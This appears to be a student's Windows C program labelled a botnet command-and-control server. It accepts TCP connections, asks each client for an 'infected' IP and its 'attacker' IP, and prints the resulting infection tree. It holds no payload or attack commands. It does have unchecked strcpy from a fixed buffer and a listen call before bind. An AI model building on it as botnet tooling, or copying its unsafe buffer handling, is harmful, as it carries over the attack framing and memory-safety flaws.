// Name: jojo_botnet_server.c
// Author: dipper pine
// Date: 22.6.2026
// Description: this code A server-side program for Jojo's Botnet where the program will accept up to 100 connections 
//              (some of which will arrive simultaneously) and records the botnet array in a tree configuration.
// includes & mpre
#define WIN32_LEAN_AND_MEAN
#include<io.h>
#include <windows.h>
#include <winternl.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>
#include <stdbool.h>
#include <ip2string.h>
#include <Inaddr.h>
#include <Mstcpip.h>

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "ntdll.lib")

#define DEFAULT_BUFLEN 31
#define DEFAULT_PORT "27015"
#define MAXCONECN 100



// structs 
// it is being used only to print
struct jojo_botnet_node
{
    //beware to use strcpy to insert value
    char host_ip[31];
    char parent_ip[31];
    int longhostip;
    int longparentip;

    //struct jojo_botnet_server* parrent_adress;
};



// this func recives a pointer an ip str 
// returns true if it is valid else false
//check whether the IP is valid or not
bool check_ip(char *ip) 
{ 
    // convert to ip and check for error

    PCSTR  Terminator;
    struct in_addr aIpv4;
    NTSTATUS is_ip = (RtlIpv4StringToAddressA(ip, true, &Terminator, &aIpv4));
    
    
    if (is_ip != STATUS_SUCCESS )
    {
        return false;
    }
    return true;
    
}




// this func get number of object in a jojo struct array and prints them
void print_struct (struct jojo_botnet_node my_cANDc[100], int number_of_object )
{
    
    for (int object = 0; object<number_of_object ; object ++)
    {
        printf("\nobject: %d\nhost: %s\nparent: %s\n------------", object, my_cANDc[object].host_ip, my_cANDc[object].parent_ip);
    }
    
}

/*
recives a number of tabs to print and prints them
*/
void echo_tabs (int num_tabs)
{
    for (int tab = 0; tab < num_tabs; tab ++){
        printf("\t");
    }
}

/*
this func recives 2d array with lists of infected devices, list of 100 jojo struct, 
        num of base device to ittirate devices, distance from left
prints a tree of the ip in the struct by the logoc of the 2d array
2 d array each row represents an object (ip) and the 
numbers in the row represent the numbers of the struct which he infected
*/
void print_tree (int parent_list [100][100], int base_device, int tab_dis ,struct jojo_botnet_node my_cANDc[100])
{
    
    // iterate through column (the ones he infected)
    for (int column = 0; (parent_list[base_device][column] > -1 )&&(column<100); column ++)
    {
        if (parent_list[base_device][column] == 0){
            continue;
        }
        echo_tabs(tab_dis);
        printf("|\n");
        echo_tabs(tab_dis);
        printf("=> %s\n", my_cANDc[parent_list[base_device][column]].host_ip);

        print_tree (parent_list, parent_list[base_device][column], tab_dis + 1, my_cANDc );
    }
    return;
}






// this func print 2 d array up to the column it recives as the second argument
void print2darray_parent_list (int parent_list[100][100], int node_counter)
{
    printf("2D Array Elements:\n");
    for (int column = 0; column < node_counter; column++) {
        for (int row = 0; row < 100 && parent_list[column][row] > -1; row++) {
            printf("%d ", parent_list[column][row]);
        }
        printf("\n");
    }

}

int __cdecl main(void) 
{
    // general variables
    int node_counter = 1;
    int  clear_arrays = 0;
    char *first_message = ("enter your ip press enter \n");
    char *affirmation_of_ip = ("ip recived\n");
    char *get_attacker_of_ip = ("enter who u got it from\n");

    char *error_1 = ("input not registered ip\n");

    // 2 d array each row represents an object (ip) and the 
    // numbers in the row represent the numbers of the struct which he infected
    int parent_list [100][100];
    int temp_openArray[100]; //represent the open slot in each array to attack computer
    // reset array
    int row, column, parent_counter_node;
    for (row = 0; row < 100; row++) 
    {
        temp_openArray[row] = 0; //because 0 is for the host ip
        for (column = 0; column < 100; column++) 
        {
            parent_list[row][column] = -1;
        }
    }

    // parent of all [C&C] (nodes struct list) insert top values
    struct jojo_botnet_node my_cANDc[100];
    strcpy( my_cANDc[0].host_ip, "127.0.0.1"); //ip - str
    strcpy( my_cANDc[0].parent_ip, "");
    my_cANDc[0].longhostip = inet_addr(my_cANDc[0].host_ip); //ip - long
    my_cANDc[0].longparentip = inet_addr(my_cANDc[0].parent_ip);
 
    
    
    
    // server section

    // declare general variables
    WSADATA wsaData;
    int iResult;

    SOCKET ListenSocket = INVALID_SOCKET;
    SOCKET ClientSocket = INVALID_SOCKET;

    struct addrinfo *result = NULL;
    struct addrinfo hints;

    int iSendResult;
    char recvbuf[DEFAULT_BUFLEN];
    //reset array
    for(clear_arrays = 0;clear_arrays < 31; clear_arrays ++)
    {
        recvbuf[clear_arrays] = '\0';
    }

    int recvbuflen = DEFAULT_BUFLEN;
    
    // nstarting
    printf("\nstarting\n");
    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    // Resolve the server address and port
    iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
    if ( iResult != 0 ) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    // Create a SOCKET for the server to listen for client connections.
    ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (ListenSocket == INVALID_SOCKET) {
        printf("socket failed with error: %d\n", WSAGetLastError());
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

    // Setup the TCP listening socket - Bind the socket to an IP and port
    listen(ClientSocket, MAXCONECN);
    iResult = bind( ListenSocket, result->ai_addr, (int)result->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        printf("bind failed with error: %d\n", WSAGetLastError());
        freeaddrinfo(result);
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }


    iResult = listen(ListenSocket, 100);
    if (iResult == SOCKET_ERROR) {
        printf("listen failed with error: %d\n", WSAGetLastError());
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }

    // Accept a client socket
    ClientSocket = accept(ListenSocket, NULL, NULL);
    if (ClientSocket == INVALID_SOCKET) {
        printf("accept failed with error: %d\n", WSAGetLastError());
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }


    // Receive until the peer shuts down the connection
    do {
        

        printf("connection accepted:)\ntelling client to send ip's:\n");
        
        // send message of instructions
        iSendResult = send( ClientSocket, first_message, strlen(first_message), 0 );
            if (iSendResult == SOCKET_ERROR) {
                printf("send failed with error: %d\n", WSAGetLastError());
                closesocket(ClientSocket);
                WSACleanup();
                return 1;
            }

        iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
        if (iResult > 0) {
            printf("Bytes received: %d\n", iResult);




            // tell client ip recived
            iSendResult = send( ClientSocket, affirmation_of_ip, strlen(affirmation_of_ip), 0 );
            iSendResult = send( ClientSocket,get_attacker_of_ip, strlen(get_attacker_of_ip), 0 );
            if (iSendResult == SOCKET_ERROR) {
                printf("send failed with error: %d\n", WSAGetLastError());
                closesocket(ClientSocket);
                WSACleanup();
                return 1;
            }
            printf("Bytes sent: %s\n", recvbuf);
        }
        else if (iResult == 0)
            printf("Connection closing...\n");
        else  {
            printf("recv failed with error: %d\n", WSAGetLastError());
            closesocket(ClientSocket);
            WSACleanup();
            return 1;
        }

        //copy attacked ip
        strcpy( my_cANDc[node_counter].host_ip, recvbuf);

        //reset array
        for(clear_arrays = 0;clear_arrays < 31; clear_arrays ++)
        {
            recvbuf[clear_arrays] = '\0';
        }
        //// getting attacker
        iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
        if (iResult > 0) {
            printf("Bytes received: %d\n", iResult);

        // Echo the buffer back to the sender
            iSendResult = send( ClientSocket, affirmation_of_ip, strlen(affirmation_of_ip), 0 );
            if (iSendResult == SOCKET_ERROR) {
                printf("send failed with error: %d\n", WSAGetLastError());
                closesocket(ClientSocket);
                WSACleanup();
                return 1;
            }
            printf("Bytes sent: %s\n", recvbuf);
        }
        else if (iResult == 0)
            printf("Connection closing...\n");
        else  {
            printf("recv failed with error: %d\n", WSAGetLastError());
            closesocket(ClientSocket);
            WSACleanup();
            return 1;
        }

        //copy attacker ip
        strcpy( my_cANDc[node_counter].parent_ip , recvbuf);
        // clear from \n
        my_cANDc[node_counter].parent_ip[strcspn(my_cANDc[node_counter].parent_ip, "\n")] = '\0';
        my_cANDc[node_counter].host_ip[strcspn(my_cANDc[node_counter].host_ip, "\n")] = '\0';

        // check if valid ip
        if (false==check_ip(my_cANDc[node_counter].host_ip))
        {
            printf("\nhe entered coruptted ip\n");
                    
            //accept new connection
            // ready to accept new connection
            closesocket(ClientSocket);
            // Accept a client socket
            ClientSocket = accept(ListenSocket, NULL, NULL);
            if (ClientSocket == INVALID_SOCKET) 
            {
                printf("accept failed with error: %d\n", WSAGetLastError());
                closesocket(ListenSocket);
                WSACleanup();
                return 1;
            }
            continue;
        }




        // ip addresses convert
        my_cANDc[node_counter].longhostip = inet_addr(my_cANDc[node_counter].host_ip);
        my_cANDc[node_counter].longparentip = inet_addr(my_cANDc[node_counter].parent_ip);


        //reset array
        for(clear_arrays = 0;clear_arrays < 31; clear_arrays ++)
        {
            recvbuf[clear_arrays] = '\0';
        }

        // add attcked comp to attacker's list
        // and check valid parent id 
        for (parent_counter_node = 0; parent_counter_node < 100; parent_counter_node ++)
        {
            // check if attacked already recived
            int compared_ip_res = strcmp(my_cANDc[node_counter].parent_ip , my_cANDc[parent_counter_node].host_ip);
            if (compared_ip_res == 0 || my_cANDc[node_counter].longparentip == my_cANDc[parent_counter_node].longhostip)
            {
                break;
            }      
        }

        // if parent not found return error message
        if (parent_counter_node == 100)
        {  
            printf ("\n%s\n ", error_1);
            send (ClientSocket, error_1, strlen(error_1), 0);          
        }
        else // add date to the arrays
        {

            int open_slot =temp_openArray[parent_counter_node];

            parent_list [parent_counter_node][open_slot ] = node_counter;
            
            temp_openArray[parent_counter_node] ++;

            //print 2 d array to show progress hopefully


            printf("127.0.0.1\n");
            print_tree (parent_list, 0, 1, my_cANDc );

            node_counter ++;
        }





        
        // ready to accept new connection
        closesocket(ClientSocket);
        // Accept a client socket
        ClientSocket = accept(ListenSocket, NULL, NULL);
        if (ClientSocket == INVALID_SOCKET) 
        {
            printf("accept failed with error: %d\n", WSAGetLastError());
            closesocket(ListenSocket);
            WSACleanup();
            return 1;
        }


        
 

    } while (iResult > 0);
    printf("server shut doen ");

    // shutdown the connection since we're done
    iResult = shutdown(ClientSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        printf("shutdown failed with error: %d\n", WSAGetLastError());
        closesocket(ClientSocket);
        WSACleanup();
        return 1;
    }

    // cleanup:

    // No longer need server socket
    closesocket(ListenSocket);

    closesocket(ClientSocket);
    WSACleanup();

    return 0;
}